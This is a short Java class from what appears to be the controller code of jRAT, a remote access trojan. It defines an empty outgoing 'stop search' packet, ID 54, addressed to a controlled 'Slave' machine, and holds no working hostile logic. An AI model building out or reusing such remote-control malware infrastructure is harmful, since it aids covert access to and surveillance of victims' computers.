package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class Packet54StopSearch implements OutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 54;
	}

}
